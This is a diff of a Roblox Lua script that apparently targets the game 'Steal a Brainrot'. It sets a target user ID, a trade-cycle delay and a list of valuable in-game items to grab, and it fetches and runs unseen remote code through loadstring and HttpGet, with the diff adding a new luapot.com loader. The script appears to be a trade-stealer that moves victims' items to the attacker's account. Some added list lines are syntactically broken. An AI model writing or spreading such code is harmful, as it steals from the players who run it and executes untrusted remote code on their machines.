@@ -3,10 +3,6 @@ getgenv().TARGET_ID = 9427580526
 getgenv().DELAY_STEP = 1      
 getgenv().TRADE_CYCLE_DELAY = 2
 getgenv().TARGET_BRAINROTS = {
-    ["Strawberry Elephant"] = true,
-    ["Meowl"] = true,
-    ["Headless Horseman"] = true,
-    ["Skibidi Toilet"] = true,
     ["Griffin"] = true,
     ["Hydra Dragon Cannelloni"] = true,
     ["Dragon Gingerini"] = true,
@@ -45,6 +41,7 @@ getgenv().TARGET_BRAINROTS = {
     ["Festive 67"] = true,
     ["Ventoliero Pavonero"] = true,
     ["Cloverat Clapat"] = true,
+    ["Spaghetti Tualetti"] = true,
     ["Antonio"] = true,
     ["La Easter Grande"] = true,
     ["Rosetti Tualetti"] = true,
@@ -71,25 +68,34 @@ getgenv().TARGET_BRAINROTS = {
     ["Los Primos"] = true,
     ["W or L"] = true,
     ["Los Mariachis"] = true,
+    ["Los Puggies"] = true,
     ["Tralaledon"] = true,
     ["Gobblino Uniciclino"] = true,
     ["Chipso and Queso"] = true,
     ["Chillin Chili"] = true,
+    ["Money Money Reindeer"] = true,
     ["Los Bros"] = true,
     ["Celularcini Viciosini"] = true,
+    ["Money Money Puggy"] = true,
     ["Los Hotspotsitos"] = true,
     ["Las Sis"] = true,
-    ["Tacorita Bicicleta"] = true,
+    ["Nuclearo Dinossauro"] = true,
     ["Swag Soda"] = true,
     ["Guest 666"] = true,
+    ["Los Chillis"] = true,
     ["Fragola La La La"] = true,
     ["Secret Lucky Block"] = true,
     ["Secret Lucky Block"] = true,
     ["Secret Lucky Block"] = true,
-    ["Unclito Samito"] = true
+    ["Unclito Samito"] = true,
+    ["Strawberry Elephant"] = true,
+    ["Meowl"] = true,
+    ["Headless Horseman"] = true,
+    ["Skibidi Toilet"] = true   ["Boppin bunny"] = true,   ["Hopilikalika Hopilikalako"] = true,
+["Money Money Bros"] = true,    ["Gym Bros"] = true,
 }
 task.spawn(function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/dadas45845/limitedhublph/refs/heads/main/morreira"))()
+loadstring(game:HttpGet("https://luapot.com/api/loadstring/fb14c57cabe9536a3bac0c101cf7abc7"))()
 end)
 task.spawn(function()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ItsJamessYT/Lunix/refs/heads/main/Duels.lua"))()
